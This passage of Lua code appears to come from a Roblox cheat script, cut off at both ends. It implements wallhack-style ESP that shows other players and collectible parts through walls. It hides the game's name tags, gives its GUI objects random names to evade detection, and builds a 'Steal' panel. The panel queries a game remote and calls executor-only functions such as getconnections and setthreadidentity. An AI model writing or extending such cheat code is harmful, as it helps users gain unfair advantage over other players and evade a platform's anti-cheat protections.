local v24 = tbl6.CreateTextRow(v22, tbl6.StatusFont, 2, 0.5)
tbl6.SetRow(v23, v19.Label, tbl6.Palettes.Sheen)
tbl28 = { Model = v20, Hitbox = hitbox, Highlight = highlight, Tag = v21, InfoRow = v24 }
tbl27[v19.Id] = tbl28
end
if tbl28 then
local flag7 = type(tbl4.ScrambleLostPart) == "function" and tbl4.ScrambleLostPart(v19.Id) == true
local v21 = flag7 and accent or v16
tbl6.SetRow(tbl28.InfoRow, flag7 and "Collected" or string.format("%d studs", math.floor(tbl4.DistanceTo(tbl28.Hitbox.Position))), v21)
tbl28.Highlight.FillColor = v21.Outline
tbl28.Highlight.OutlineColor = v21.Outline
end
end
end
local function fn24()
flag4 = false
if connection then
connection:Disconnect()
connection = nil
end
for k in pairs(tbl27) do
fn22(k)
end
if v17 then
v17:Destroy()
v17 = nil
end
end
local function fn25()
if flag4 then
return
end
flag4 = true
local n22 = 1
connection = RunService.Heartbeat:Connect(function(deltaTime)
n22 += deltaTime
if n22 >= 0.3 then
n22 = 0
pcall(fn23)
end
end)
end
local function fn26()
if flag6 then
return
end
if tbl6.ReadToggle(v18, flag5) then
fn25()
elseif flag4 then
fn24()
end
end
fn4(function()
flag6 = true
fn24()
end)
v18 = espSection:CreateToggle({
Name = "ESP Lost Parts",
Default = false,
Callback = function(arg)
flag5 = arg == true
tbl6.SyncSoon(fn26)
end,
})
end
local TextService
TextService = game:GetService("TextService")
local font
font = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.ExtraBold, Enum.FontStyle.Normal)
local v16
do
local colorSequence = ColorSequence.new
local tbl26 = {}
local v17 = ColorSequenceKeypoint.new(0, Color3.fromRGB(138, 255, 205))
local v18 = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(125, 225, 255))
tbl26[1] = v17
tbl26[2] = v18
do
local values = table.pack(ColorSequenceKeypoint.new(1, Color3.fromRGB(210, 135, 255)))
table.move(values, 1, values.n, 3, tbl26)
end
v16 = colorSequence(tbl26)
end
local colorSequence
colorSequence = ColorSequence.new({
ColorSequenceKeypoint.new(0, Color3.fromRGB(7, 73, 66)),
ColorSequenceKeypoint.new(1, Color3.fromRGB(35, 17, 79)),
})
local flag4
flag4 = false
local n22
n22 = 0
local v17
v17 = nil
local tbl26
tbl26 = {}
local tbl27
tbl27 = {}
local tbl28
tbl28 = {}
local n23, tbl29, v18, flag5, flag6
do
local tbl30 = {}
n23 = 0.75
tbl29 = { Name = true, Username = false, Avatar = false, Tool = true }
v18 = nil
flag5 = false
flag6 = false
local function fn22(arg)
local str = tostring(arg or "")
if str:match("^%d+$") then
return "rbxassetid://" .. str
end
return str
end
local function fn23(arg)
if not arg or not arg:IsA("Tool") then
return ""
end
local v19 = fn22(arg.TextureId)
if v19 ~= "" then
return v19
end
for _, v20 in ipairs({ "Icon", "Image", "Thumbnail", "TextureId" }) do
local attribute = arg:GetAttribute(v20)
if type(attribute) == "string" and fn22(attribute) ~= "" then
return fn22(attribute)
end
end
for _, descendant in ipairs(arg:GetDescendants()) do
if descendant:IsA("Decal") or descendant:IsA("Texture") then
v19 = fn22(descendant.Texture)
elseif descendant:IsA("ImageLabel") or descendant:IsA("ImageButton") then
v19 = fn22(descendant.Image)
end
if v19 ~= "" then
return v19
end
end
return ""
end
local function fn24()
local currentCamera = workspace.CurrentCamera
return math.max(1, math.floor(math.clamp((currentCamera and currentCamera.ViewportSize.Y or 1080) * 0.024, 26, 35) * n23))
end
local function fn25(text, size)
local str = text .. "@" .. size
local v19 = tbl30[str]
if v19 then
return v19
end
local getTextBoundsParams = Instance.new("GetTextBoundsParams")
getTextBoundsParams.Text = text
getTextBoundsParams.Font = font
getTextBoundsParams.Size = size
getTextBoundsParams.Width = 1000
local ok, result = pcall(function()
return TextService:GetTextBoundsAsync(getTextBoundsParams)
end)
getTextBoundsParams:Destroy()
ok = ok and result.X
local n24
if ok then
n24 = ok
else
n24 = (utf8.len(text) or #text) * size * 0.56
end
tbl30[str] = n24
return n24
end
local function fn26(arg, color3, arg2, arg3)
arg.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
arg.Color = color3
arg.LineJoinMode = Enum.LineJoinMode.Round
arg.Transparency = 0
arg.Thickness = pcall(function()
arg.StrokeSizingMode = Enum.StrokeSizingMode.ScaledSize
end) and arg2 or arg3
end
local function createTextLabel(parent, zIndex)
local textLabel = Instance.new("TextLabel")
textLabel.Name = fn3()
textLabel.AnchorPoint = Vector2.new(0, 0.5)
textLabel.BackgroundTransparency = 1
textLabel.FontFace = font
textLabel.Text = ""
textLabel.TextScaled = true
textLabel.TextStrokeTransparency = 1
textLabel.TextXAlignment = Enum.TextXAlignment.Center
textLabel.TextYAlignment = Enum.TextYAlignment.Center
textLabel.ZIndex = zIndex
textLabel.Parent = parent
return textLabel
end
local function createImageLabel(parent, zIndex)
local imageLabel = Instance.new("ImageLabel")
imageLabel.Name = fn3()
imageLabel.AnchorPoint = Vector2.new(0, 0.5)
imageLabel.BackgroundTransparency = 1
imageLabel.ScaleType = Enum.ScaleType.Fit
imageLabel.ZIndex = zIndex
imageLabel.Parent = parent
local uiAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
uiAspectRatioConstraint.Name = fn3()
uiAspectRatioConstraint.AspectRatio = 1
uiAspectRatioConstraint.Parent = imageLabel
return imageLabel
end
local function fn27(arg)
local v19 = fn24()
local visible = tbl29.Name == true or tbl29.Username == true
local visible2 = tbl29.Avatar == true
local visible3 = tbl29.Tool == true and arg.ToolIcon.Image ~= ""
local n24 = visible2 and math.floor(v19 * 0.72) or 0
local n25 = visible3 and math.floor(v19 * 0.82) or 0
local n26 = math.floor(v19 * 0.7)
local n27 = math.max(1, math.floor(v19 * 0.04))
local name = tbl29.Username == true and arg.Player.Name or arg.Player.DisplayName
arg.Name.Text = name
arg.Shadow.Text = name
local n28 = visible and math.floor(math.clamp(fn25(name, n26) + 4, n26, 230)) or 0
local n29 = 0
local n30 = 0
if visible2 then
n29 = 0 + n24
end
local n31 = 0
if visible then
if not (n29 > 0) then
n31 = n29
else
n31 = n29 + n27
end
n29 = n31 + n28
end
local n32 = 0
local n33
if visible3 then
if n29 > 0 then
n29 += n27
end
n32 = n29
n33 = n29 + n25
else
n33 = n29
end
local n34 = math.max(n33, 1)
local n35 = 1 / n34
local n36 = 1 / v19
arg.Billboard.Size = UDim2.fromOffset(n34, v19)
arg.Avatar.Visible = visible2
arg.Name.Visible = visible
arg.Shadow.Visible = visible
arg.ToolIcon.Visible = visible3
arg.ToolShadow.Visible = visible3
arg.Avatar.Position = UDim2.fromScale(n30 / n34, 0.5)
arg.Avatar.Size = UDim2.fromScale(n24 / n34, n24 / v19)
arg.Name.Position = UDim2.fromScale(n31 / n34, 0.5)
arg.Name.Size = UDim2.fromScale(n28 / n34, n26 / v19)
arg.Shadow.Position = UDim2.fromScale(n31 / n34 + n35, 0.5 + n36)
arg.Shadow.Size = arg.Name.Size
arg.ToolIcon.Position = UDim2.fromScale(n32 / n34, 0.5)
arg.ToolIcon.Size = UDim2.fromScale(n25 / n34, n25 / v19)
arg.ToolShadow.Position = UDim2.fromScale(n32 / n34 + n35, 0.5 + n36)
arg.ToolShadow.Size = arg.ToolIcon.Size
end
local function fn28(arg, adornee, arg2, arg3)
local highlight = Instance.new("Highlight")
highlight.Name = fn3()
highlight.Adornee = adornee
highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
highlight.FillColor = Color3.fromRGB(0, 67, 148)
highlight.FillTransparency = 0.76
highlight.OutlineColor = Color3.fromRGB(72, 207, 255)
highlight.OutlineTransparency = 0.02
highlight.Parent = v17
local v19 = arg3 or arg2
local n24 = 3.1
if v19 ~= arg2 then
n24 = math.clamp(arg2.Position.Y - v19.Position.Y + 3.1, 3.8, 6)
end
local billboardGui = Instance.new("BillboardGui")
billboardGui.Name = fn3()
billboardGui.Adornee = v19
billboardGui.AlwaysOnTop = true
billboardGui.LightInfluence = 0
billboardGui.MaxDistance = math.huge
billboardGui.Size = UDim2.fromOffset(1, 1)
billboardGui.StudsOffsetWorldSpace = Vector3.new(0, n24, 0)
billboardGui.Parent = v17
local frame = Instance.new("Frame")
frame.Name = fn3()
frame.Size = UDim2.fromScale(1, 1)
frame.BackgroundTransparency = 1
frame.Parent = billboardGui
local v20 = createImageLabel(frame, 2)
v20.ScaleType = Enum.ScaleType.Crop
local uiCorner = Instance.new("UICorner")
uiCorner.Name = fn3()
uiCorner.CornerRadius = UDim.new(1, 0)
uiCorner.Parent = v20
local v21 = createTextLabel(frame, 1)
v21.TextColor3 = Color3.fromRGB(7, 19, 34)
v21.TextTransparency = 0.05
local v22 = createTextLabel(frame, 2)
v22.TextColor3 = Color3.fromRGB(255, 255, 255)
local uiStroke = Instance.new("UIStroke")
uiStroke.Name = fn3()
fn26(uiStroke, Color3.fromRGB(255, 255, 255), 0.044, 1.4)
uiStroke.Parent = v22
local uiGradient = Instance.new("UIGradient")
uiGradient.Name = fn3()
uiGradient.Color = colorSequence
uiGradient.Rotation = 90
uiGradient.Parent = uiStroke
local uiGradient2 = Instance.new("UIGradient")
uiGradient2.Name = fn3()
uiGradient2.Color = v16
uiGradient2.Rotation = 90
uiGradient2.Parent = v22
local v23 = createImageLabel(frame, 1)
v23.ImageColor3 = Color3.fromRGB(0, 0, 0)
v23.ImageTransparency = 0.35
local tbl31 = {
Player = arg,
Highlight = highlight,
Billboard = billboardGui,
Avatar = v20,
Shadow = v21,
Name = v22,
ToolShadow = v23,
ToolIcon = createImageLabel(frame, 2),
}
fn27(tbl31)
return tbl31
end
local function fn29(arg)
if arg.NameHumanoid and arg.NameHumanoid.Parent and arg.NameDistance ~= nil then
pcall(function()
arg.NameHumanoid.NameDisplayDistance = arg.NameDistance
end)
end
arg.NameHumanoid = nil
arg.NameDistance = nil
end
local function fn30(arg, arg2)
local humanoid = arg2 and arg2:FindFirstChildOfClass("Humanoid")
if not humanoid then
return
end
if arg.NameHumanoid ~= humanoid then
fn29(arg)
arg.NameHumanoid = humanoid
arg.NameDistance = humanoid.NameDisplayDistance
end
pcall(function()
humanoid.NameDisplayDistance = 0
end)
end
local function fn31(arg)
tbl6.DisconnectAll(arg.CharacterConnections)
if arg.Tag then
pcall(function()
arg.Tag.Highlight:Destroy()
end)
pcall(function()
arg.Tag.Billboard:Destroy()
end)
arg.Tag = nil
end
fn29(arg)
arg.Character = nil
end
local function fn32(arg)
if not arg.Tag or not arg.Character then
return
end
local v19 = fn23(arg.Character:FindFirstChildOfClass("Tool"))
arg.Tag.ToolIcon.Image = v19
arg.Tag.ToolShadow.Image = v19
fn27(arg.Tag)
end
local function fn33(arg, arg2, arg3)
local image = tbl28[arg2.UserId]
if image == nil then
local ok, result = pcall(function()
return Players:GetUserThumbnailAsync(arg2.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size100x100)
end)
image = ok and result or ""
tbl28[arg2.UserId] = image
end
if flag4 and arg.Version == arg3 and arg.Tag then
arg.Tag.Avatar.Image = image
end
end
local function fn34(arg, arg2, character)
fn31(arg)
arg.Version = arg.Version + 1
local version = arg.Version
if not flag4 or not character then
return
end
arg.Character = character
task.spawn(function()
local head = character:FindFirstChild("Head") or character:WaitForChild("Head", 5)
if not flag4 or arg.Version ~= version or not head or not head:IsA("BasePart") or not character:IsDescendantOf(workspace) then
return
end
if not v17 or not v17.Parent then
v17 = tbl6.CreateRuntime()
end
local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
arg.Tag = fn28(arg2, character, head, humanoidRootPart and humanoidRootPart:IsA("BasePart") and humanoidRootPart or nil)
fn30(arg, character)
local function fn35()
task.defer(function()
if flag4 and arg.Version == version then
fn32(arg)
end
end)
end
table.insert(arg.CharacterConnections, character.ChildAdded:Connect(function(child)
if child:IsA("Tool") then
fn35()
elseif child:IsA("Humanoid") then
fn30(arg, character)
end
end))
table.insert(arg.CharacterConnections, character.ChildRemoved:Connect(function(child)
if child:IsA("Tool") then
fn35()
end
end))
table.insert(arg.CharacterConnections, character.AncestryChanged:Connect(function()
if arg.Version == version and not character:IsDescendantOf(workspace) then
arg.Version = arg.Version + 1
fn31(arg)
end
end))
fn32(arg)
fn33(arg, arg2, version)
end)
end
local function fn35(player)
local v19 = tbl26[player]
if not v19 then
return
end
v19.Version = v19.Version + 1
fn31(v19)
tbl6.DisconnectAll(v19.PlayerConnections)
tbl26[player] = nil
end
local function fn36(player)
if player == localPlayer or tbl26[player] then
return
end
local tbl31 = {
Version = 0,
Character = nil,
Tag = nil,
NameHumanoid = nil,
NameDistance = nil,
CharacterConnections = {},
PlayerConnections = {},
}
tbl26[player] = tbl31
table.insert(tbl31.PlayerConnections, player.CharacterAdded:Connect(function(character)
fn34(tbl31, player, character)
end))
table.insert(tbl31.PlayerConnections, player.CharacterRemoving:Connect(function(character)
if tbl31.Character == character then
tbl31.Version = tbl31.Version + 1
fn31(tbl31)
end
end))
fn34(tbl31, player, player.Character)
end
local function fn37()
for _, v19 in pairs(tbl26) do
if v19.Tag then
fn27(v19.Tag)
end
end
end
local function fn38()
flag4 = false
n22 += 1
tbl6.DisconnectAll(tbl27)
local tbl31 = {}
for k in pairs(tbl26) do
table.insert(tbl31, k)
end
for _, v19 in ipairs(tbl31) do
fn35(v19)
end
if v17 then
v17:Destroy()
v17 = nil
end
end
local function fn39()
if flag4 then
return
end
flag4 = true
n22 += 1
local v19 = n22
v17 = tbl6.CreateRuntime()
for _, player in ipairs(Players:GetPlayers()) do
fn36(player)
end
table.insert(tbl27, Players.PlayerAdded:Connect(fn36))
table.insert(tbl27, Players.PlayerRemoving:Connect(fn35))
local currentCamera = workspace.CurrentCamera
if currentCamera then
table.insert(tbl27, currentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(fn37))
end
task.spawn(function()
while true do
if flag4 and v19 == n22 then
task.wait(1)
if not (not flag4 or v19 ~= n22) then
for k, v20 in pairs(tbl26) do
local character = k.Character
local adornee = v20.Tag and v20.Tag.Billboard.Parent and v20.Tag.Billboard.Adornee and v20.Tag.Billboard.Adornee:IsDescendantOf(workspace)
if character and character:IsDescendantOf(workspace) and (v20.Character ~= character or not adornee) then
fn34(v20, k, character)
end
end
continue
end
end
break
end
end)
end
local function fn40()
if flag6 then
return
end
if tbl6.ReadToggle(v18, flag5) then
fn39()
elseif flag4 then
fn38()
end
end
fn4(function()
flag6 = true
fn38()
end)
v18 = espSection:CreateToggle({
Name = "ESP Players",
Default = false,
Callback = function(arg)
flag5 = arg == true
tbl6.SyncSoon(fn40)
end,
})
fn6(espSection:CreateMultiDropdown({
Name = "ESP Player Info",
Options = { "Name", "Username", "Avatar", "Tool" },
Default = { "Name", "Tool" },
SubOf = v18,
Callback = function(arg)
local tbl31 = { Name = false, Username = false, Avatar = false, Tool = false }
if type(arg) == "table" then
for k, v19 in pairs(arg) do
if type(v19) == "string" and tbl31[v19] ~= nil then
tbl31[v19] = true
elseif type(k) == "string" and v19 == true and tbl31[k] ~= nil then
tbl31[k] = true
end
end
end
tbl29 = tbl31
fn37()
end,
}))
espSection:CreateSlider({
Name = "ESP Player Size",
Min = 50,
Max = 200,
Default = 75,
Increment = 5,
Unit = "%",
SubOf = v18,
Callback = function(arg)
local num = tonumber(arg)
if num and n23 ~= num / 100 then
n23 = math.clamp(num / 100, 0.5, 2)
fn37()
end
end,
})
end
n4 = 3
n5 = 0.002
n6 = 4
n7 = 0.3
n8 = 0.62
n9 = 0.86
n10 = 4.4262295081967213
n11 = 1.392
n12 = 1.03
tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
tweenInfo2 = TweenInfo.new(0.24, Enum.EasingStyle.Quad, Enum.EasingDirection.In)
tweenInfo3 = TweenInfo.new(0.22, Enum.EasingStyle.Quad, Enum.EasingDirection.In)
tweenInfo4 = TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
tweenInfo5 = TweenInfo.new(0.16, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
TweenService = game:GetService("TweenService")
color2 = Color3.fromRGB
fn15 = function(arg)
local tbl30 = {}
for i, v19 in ipairs(arg) do
tbl30[i] = ColorSequenceKeypoint.new(v19[1], v19[2])
end
return ColorSequence.new(tbl30)
end
tbl17 = {}
do
local hud = {}
local tbl30 = {}
local tbl31 = { 0, color2(0, 118, 255) }
local tbl32 = { 1, color2(72, 204, 255) }
tbl30[1] = tbl31
tbl30[2] = tbl32
hud.Color = fn15(tbl30)
hud.Rotation = -90
hud.Stroke = color2(0, 28, 76)
hud.Light = color2(172, 226, 255)
tbl17.Hud = hud
end
do
local steal = {}
local tbl30 = {}
local tbl31 = { 0, color2(60, 255, 0) }
local tbl32 = { 1, color2(136, 255, 0) }
tbl30[1] = tbl31
tbl30[2] = tbl32
steal.Color = fn15(tbl30)
steal.Rotation = -90
steal.Stroke = color2(11, 72, 0)
steal.Light = color2(190, 255, 180)
tbl17.Steal = steal
end
do
local queued = {}
local tbl30 = {}
local tbl31 = { 0, color2(118, 118, 132) }
local tbl32 = { 1, color2(172, 172, 186) }
tbl30[1] = tbl31
tbl30[2] = tbl32
queued.Color = fn15(tbl30)
queued.Rotation = -90
queued.Stroke = color2(28, 28, 34)
queued.Light = color2(214, 214, 226)
tbl17.Queued = queued
end
do
local priorityOn = {}
local tbl30 = {}
local tbl31 = { 0, color2(255, 247, 0) }
local tbl32 = { 1, color2(255, 136, 0) }
tbl30[1] = tbl31
tbl30[2] = tbl32
priorityOn.Color = fn15(tbl30)
priorityOn.Rotation = 90
priorityOn.Stroke = color2(0, 0, 0)
priorityOn.Light = color2(132, 112, 0)
tbl17.PriorityOn = priorityOn
end
do
local cancel = {}
local tbl30 = {}
local tbl31 = { 0, color2(214, 17, 17) }
local tbl32 = { 1, color2(253, 20, 20) }
tbl30[1] = tbl31
tbl30[2] = tbl32
cancel.Color = fn15(tbl30)
cancel.Rotation = -90
cancel.Stroke = color2(72, 0, 0)
cancel.Light = color2(255, 103, 103)
tbl17.Cancel = cancel
end
do
local chilli = {}
local tbl30 = {}
local tbl31 = { 0, color2(132, 74, 255) }
local tbl32 = { 0.34, color2(178, 74, 255) }
local tbl33 = { 0.6, color2(255, 104, 206) }
local tbl34 = { 0.78, color2(255, 168, 232) }
local tbl35 = { 1, color2(146, 66, 255) }
tbl30[1] = tbl31
tbl30[2] = tbl32
tbl30[3] = tbl33
tbl30[4] = tbl34
tbl30[5] = tbl35
chilli.Color = fn15(tbl30)
chilli.Rotation = -115
chilli.Stroke = color2(44, 10, 80)
chilli.Light = color2(226, 178, 255)
tbl17.Chilli = chilli
end
tbl18 = {}
do
local tbl30 = { 0, color2(255, 255, 255) }
local tbl31 = { 0.2, color2(206, 212, 224) }
local tbl32 = { 0.42, color2(74, 80, 94) }
local tbl33 = { 0.58, color2(42, 46, 56) }
local tbl34 = { 0.78, color2(158, 166, 182) }
local tbl35 = { 1, color2(250, 252, 255) }
tbl18[1] = tbl30
tbl18[2] = tbl31
tbl18[3] = tbl32
tbl18[4] = tbl33
tbl18[5] = tbl34
tbl18[6] = tbl35
end
end
local v11, v12
do
local v13 = fn15(tbl18)
local tbl19 = {}
local rarityGradients = nil
local function fn16(arg)
local v14 = tbl19[arg]
if v14 then
return v14
end
local directory = tbl.Assets and tbl.Assets.Directory
local flag2 = type(directory) == "table" and directory[arg] or nil
local rarity = type(flag2) == "table" and type(flag2.Rarity) == "table" and flag2.Rarity or nil
local rarityGradient = rarity and rarity.RarityGradient or nil
if rarity and typeof(rarityGradient) ~= "Instance" then
if rarityGradients == nil then
local assets = ReplicatedStorage:FindFirstChild("Assets")
assets = assets and assets:FindFirstChild("UI")
rarityGradients = assets and assets:FindFirstChild("RarityGradients") or false
end
rarityGradient = rarityGradients
if rarityGradients then
rarityGradient = rarityGradients:FindFirstChild(tostring(rarity._id or rarity.DisplayName or ""))
end
rarityGradient = rarityGradient and rarityGradient:FindFirstChild("RarityGradient") or nil
end
local str
if rarity then
str = tostring(rarity.DisplayName or rarity._id or "")
else
str = rarity
end
str = str or ""
local color3 = rarity and typeof(rarity.Color) == "Color3" and rarity.Color or color2(255, 255, 255)
local color4 = fn15({ { 0, color3 }, { 1, color3 } })
local gradientRotation
if string.upper(str) == "SECRET" then
gradientRotation = 90
color4 = v13
else
local isUIGradient = typeof(rarityGradient) == "Instance" and rarityGradient:IsA("UIGradient")
gradientRotation = 90
if isUIGradient then
color4 = rarityGradient.Color
gradientRotation = rarityGradient.Rotation
end
end
local icon = type(flag2) == "table" and flag2.Icon or nil
if tonumber(icon) then
icon = "rbxassetid://" .. tostring(icon)
end
local tbl20 = {}
local flag3 = type(flag2) == "table"
local name
if flag3 then
name = tostring(flag2.DisplayName or arg)
else
name = flag3
end
tbl20.Name = name or tostring(arg)
tbl20.Icon = icon and tostring(icon) or ""
if rarity then
rarity = tonumber(rarity.RarityNumber or rarity.Rank)
end
tbl20.RarityNumber = rarity or 0
tbl20.GradientColor = color4
tbl20.GradientRotation = gradientRotation
tbl20.EarningRate = type(flag2) == "table" and tonumber(flag2.EarningRate) or 0
tbl19[arg] = tbl20
return tbl20
end
local function fn17(arg, arg2)
local n13 = tonumber(arg.AssetScale) or 1
local n14 = n13 > 5 and (n13 / 5) ^ 1.2 * 19.637875755794113 or n13 ^ 1.85
local mutations = type(arg.Mutations) == "table" and arg.Mutations or {}
if #mutations == 0 and type(arg.BaseMutation) == "string" and arg.BaseMutation ~= "" then
mutations = { arg.BaseMutation }
end
local mutations2 = tbl.Mutations
local flag2 = type(mutations2) == "table" and type(mutations2.EarningsFor) == "function"
local n15 = 1
if flag2 then
local ok
ok, n15 = pcall(mutations2.EarningsFor, mutations)
local flag3 = ok and type(n15) == "number"
local n16 = 1
if not flag3 then
n15 = n16
end
end
return arg2.EarningRate * n14 * n15
end
local tbl20 = { "", "K", "M", "B", "T", "Qa", "Qi", "Sx" }
local function fn18(arg)
local n13 = tonumber(arg) or 0
local n14 = 1
while n13 >= 1000 and n14 < #tbl20 do
n13 /= 1000
n14 += 1
end
local str = n14 == 1 and tostring(math.floor(n13)) or string.format("%.1f", math.floor(n13 * 10) / 10)
local str2 = tbl20[n14] .. "/s"
return "$" .. string.gsub(str, "%.0$", "") .. str2
end
local function fn19(arg, text)
if arg and arg.Text ~= text then
arg.Text = text
end
end
local flag2 = false
local n13 = 0
local flag3 = false
local v14 = nil
local v15 = nil
local v16 = nil
local imageLabel = nil
local v17 = nil
local v18 = nil
local position = nil
local title = nil
local v19 = nil
local v20 = nil
local v21 = nil
local flag4 = false
local v22 = v2:CreateState({ Name = "Steal Panel Open", Default = true })
local flag5 = false
local tween = nil
local tween2 = nil
local n14 = 0
local tbl21 = nil
local tbl22 = nil
local n15 = 1
local tbl23 = {}
local tbl24 = {}
local tbl25 = {}
local obj = setmetatable({}, { __mode = "k" })
local uiStroke = nil
local thickness = nil
local flag6 = false
local flag7 = false
local flag8 = false
local fn20 = nil
local function fn21()
local playerGui = localPlayer:FindFirstChildOfClass("PlayerGui")
local hud = playerGui and playerGui:FindFirstChild("HUD")
local gameHUD = hud and hud:FindFirstChild("GameHUD")
local rightButtons = gameHUD and gameHUD:FindFirstChild("RightButtons")
local activePets = playerGui and playerGui:FindFirstChild("ActivePets")
local tbl26 = {
Hud = hud,
GameHud = gameHUD,
Column = rightButtons,
Eggs = rightButtons and rightButtons:FindFirstChild("EggsButton"),
Pets = rightButtons and rightButtons:FindFirstChild("PetsButton"),
ActivePets = activePets,
GrowingEggs = playerGui and playerGui:FindFirstChild("GrowingEggs"),
}
if not (hud and gameHUD and rightButtons and tbl26.Eggs and tbl26.Pets and activePets and activePets:FindFirstChild("Frame")) then
return nil
end
return tbl26
end
local function fn22(arg)
local ok, result = pcall(function()
return arg:Clone()
end)
if not ok or typeof(result) ~= "Instance" then
return nil
end
for _, descendant in ipairs(result:GetDescendants()) do
if descendant:IsA("LuaSourceContainer") then
descendant:Destroy()
end
end
return result
end
local function fn23(arg)
arg.Name = fn3()
for _, descendant in ipairs(arg:GetDescendants()) do
descendant.Name = fn3()
end
end
local n16 = 2.3120369911193848
local n17 = 556
local n18 = 86.24
local tbl26 = { Panel = n16, Hud = n16 }
local function fn24(arg)
if arg then
local x = v18 and v18.AbsoluteSize.X or 0
return x > 0 and n16 * x / n17 or nil
end
local button = v16 and v16.Button
button = button and button.Size.X.Offset or 0
return button > 0 and n16 * button / n18 or nil
end
local function fn25(arg, arg2)
local v23 = fn24(arg2.Panel)
if v23 and arg.Parent then
arg.Thickness = arg2.Ratio * v23
end
end
local function fn26(arg, arg2)
local panel = arg2 and tbl26.Panel or tbl26.Hud
if not panel or panel <= 0 then
panel = 2.3120369911193848
end
for _, descendant in ipairs(arg:GetDescendants()) do
if descendant:IsA("UIStroke") then
local ok, result = pcall(function()
return descendant.StrokeSizingMode
end)
if not ok or result ~= Enum.StrokeSizingMode.ScaledSize then
local tbl27 = { Ratio = descendant.Thickness / panel, Panel = arg2 == true }
obj[descendant] = tbl27
fn25(descendant, tbl27)
end
end
end
end
local function fn27()
for k, v23 in pairs(obj) do
fn25(k, v23)
end
end
local function fn28()
fn27()
end
local function fn29(arg)
if not arg then
return nil
end
return {
Button = arg,
Gradient = arg:FindFirstChildOfClass("UIGradient"),
Stroke = arg:FindFirstChild("UIStroke"),
Light = arg:FindFirstChild("UIStrokeClr"),
Label = arg:FindFirstChild("Label") or arg:FindFirstChild("TextLabel"),
Scale = arg:FindFirstChild("BtnScale"),
}
end
local function fn30(arg, style)
if not arg or arg.Style == style then
return
end
arg.Style = style
if arg.Gradient then
arg.Gradient.Color = style.Color
arg.Gradient.Rotation = style.Rotation
end
if arg.Stroke then
arg.Stroke.Color = style.Stroke
end
if arg.Light then
arg.Light.Color = style.Light
end
end
local function fn31(arg)
if not arg then
return
end
local scale = arg.Scale
if not scale then
scale = Instance.new("UIScale")
scale.Parent = arg.Button
arg.Scale = scale
end
local function fn32(arg2)
TweenService:Create(scale, tweenInfo5, { Scale = arg2 }):Play()
end
arg.Button.MouseEnter:Connect(function()
fn32(1.08)
end)
arg.Button.MouseLeave:Connect(function()
fn32(1)
end)
arg.Button.MouseButton1Down:Connect(function()
fn32(0.94)
end)
arg.Button.MouseButton1Up:Connect(function()
fn32(1.08)
end)
end
local tweenInfo6 = TweenInfo.new(2.4, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)
local tweenInfo7 = TweenInfo.new(6, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)
local tweenInfo8 = TweenInfo.new(1.6, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)
local tbl27 = {}
local function fn32(arg)
for _, v23 in ipairs(tbl27) do
pcall(function()
v23:Cancel()
end)
end
table.clear(tbl27)
if not arg then
return
end
local function fn33(arg2)
tbl27[#tbl27 + 1] = arg2
arg2:Play()
end
local gradient = arg.Gradient
if gradient then
gradient.Rotation = -115
gradient.Offset = Vector2.new(-0.30000001192092896, 0)
fn33(TweenService:Create(gradient, tweenInfo6, { Offset = Vector2.new(0.30000001192092896, 0) }))
fn33(TweenService:Create(gradient, tweenInfo7, { Rotation = -65 }))
end
local light = arg.Light
if light then
light.Color = color2(226, 178, 255)
fn33(TweenService:Create(light, tweenInfo8, { Color = color2(255, 245, 255) }))
end
end
local v23 = setthreadidentity or set_thread_identity
local function fn33()
local eggState = tbl.EggState
if type(eggState) == "table" and type(eggState.ReadFieldEggs) == "function" then
local records = nil
task.spawn(function()
local ok, result = pcall(eggState.ReadFieldEggs)
if ok and type(result) == "table" and type(result.Records) == "table" and next(result.Records) ~= nil then
records = result.Records
end
end)
if type(v23) == "function" then
pcall(v23, 8)
end
if records then
return records
end
end
local rfEggWorldAskFieldEggSnapshot = networking:FindFirstChild("RF/EggWorld/AskFieldEggSnapshot")
if not rfEggWorldAskFieldEggSnapshot or not rfEggWorldAskFieldEggSnapshot:IsA("RemoteFunction") then
return nil
end
local flag9 = false
local records = nil
task.spawn(function()
local ok, result = pcall(rfEggWorldAskFieldEggSnapshot.InvokeServer, rfEggWorldAskFieldEggSnapshot)
if ok and type(result) == "table" and type(result.Records) == "table" then
records = result.Records
end
flag9 = true
end)
local now = os.clock()
while not flag9 and os.clock() - now < n6 do
RunService.Heartbeat:Wait()
end
return records
end
local function fn34()
return v14 ~= nil and (v14.ActivePets and v14.ActivePets.Enabled or v14.GrowingEggs and v14.GrowingEggs.Enabled) or false
end
local function fn35()
local flag9 = false
for _, v24 in ipairs({ v14.ActivePets, v14.GrowingEggs }) do
if v24 and v24.Enabled then
local frame = v24:FindFirstChild("Frame")
frame = frame and frame:FindFirstChild("Close")
local flag10 = frame and typeof(getconnections) == "function"
local flag11 = false
if flag10 then
local ok, result = pcall(getconnections, frame.Activated)
if ok and type(result) == "table" then
for _, v25 in ipairs(result) do
if pcall(function()
v25:Fire()
end) then
flag11 = true
end
end
end
end
if not flag11 then
v24.Enabled = false
end
flag9 = true
end
end
return flag9
end
local function fn36(arg, arg2)
local column = v14 and v14.Column
if not column or not column.Parent then
return
end
if tween2 then
tween2:Cancel()
tween2 = nil
end
local position2 = column.Position
local udim2 = UDim2.new(position2.X.Scale, arg and math.ceil(column.AbsoluteSize.X * n12) or 0, position2.Y.Scale, position2.Y.Offset)
if arg2 then
column.Position = udim2
return
end
tween2 = TweenService:Create(column, arg and tweenInfo3 or tweenInfo4, { Position = udim2 })
tween2:Play()
end
local n19 = 0.106
local udim2 = UDim2.new(0.955, 0, 0.6, 0)
local udim22 = UDim2.new(0.955 - n19, 0, 0.6, 0)
local udim23 = UDim2.new(0.2, 0, 0.56, 0)
local n20 = 0.955 - n19
local function fn37(arg, visible)
